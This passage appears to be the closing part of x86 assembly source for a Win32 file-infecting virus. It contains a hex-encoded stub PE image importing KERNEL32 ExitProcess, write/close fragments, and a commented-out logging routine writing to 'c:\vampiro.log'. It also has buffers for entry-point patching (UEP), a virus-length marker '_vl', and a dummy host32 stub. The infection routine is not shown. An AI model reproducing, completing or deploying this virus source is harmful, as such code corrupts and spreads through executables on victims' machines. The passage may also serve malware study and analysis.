db  000h,000h,000h,000h,010h,000h,000h,020h,000h,000h,000h,000h,010h,000h
db  000h,010h,000h,000h,000h,000h,000h,000h,010h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,030h,000h,000h,054h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  043h,04Fh,044h,045h,000h,000h,000h,000h,000h,010h,000h,000h,000h,010h
db  000h,000h,000h,002h,000h,000h,000h,006h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,020h,000h,000h,060h,044h,041h
db  054h,041h,000h,000h,000h,000h,000h,010h,000h,000h,000h,020h,000h,000h
db  000h,000h,000h,000h,000h,008h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,040h,000h,000h,0C0h,02Eh,069h,064h,061h
db  074h,061h,000h,000h,000h,010h,000h,000h,000h,030h,000h,000h,000h,002h
db  000h,000h,000h,008h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,040h,000h,000h,0C0h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,06Ah,000h,0E8h,000h
db  000h,000h,000h,0FFh,025h,030h,030h,040h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,028h,030h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,038h,030h,000h,000h,030h,030h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,046h,030h,000h,000h,000h,000h,000h,000h,046h,030h,000h,000h
db  000h,000h,000h,000h,04Bh,045h,052h,04Eh,045h,04Ch,033h,032h,02Eh,064h
db  06Ch,06Ch,000h,000h,000h,000h,045h,078h,069h,074h,050h,072h,06Fh,063h
db  065h,073h,073h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
__1:    
    pop edx
    push 2560
    pop  ecx
    call write  
    call close
__2:
    ret  


COMMENT &

log db 'c:\vampiro.log',0

log_it:
    pusha 
    push edx
    lea edx, [ebp.log]
    push 2
    pop eax
    call open
    cmp eax, -1
    jnz __1
    push 0 edx
    call [ebp._lcreat]
__1:xchg eax, ebx
    call fsize
    xchg eax, edx
    call seek   
    mov edx, [esp]
    mov esi, edx
    sub ecx, ecx
__2:
    lodsb
    inc ecx
    cmp al, 0
    jnz __2
    dec ecx
    call write
    push 0D0A0D0Ah
    push 2
    pop ecx
    mov edx, esp
    call write
    pop eax
    call close 
    pop edx
    popa
    ret
&

    db '^^'

buff:  db 25*1024+8000   dup (0)
       db 1000h          dup (0)   
len_buff                 equ  $-buff
buffer db 0F8h + (28h*8) dup (0)
word3C dd                0
size_UEP                 equ 4096
UEP    db size_UEP       dup (0)
forUEP dd                0
tbl    db 2048           dup (0)
_vl equ ($-start)

.code
host32:
    jmp  $ 
real_start:
    push 0
    zcall ExitProcess 
end host32
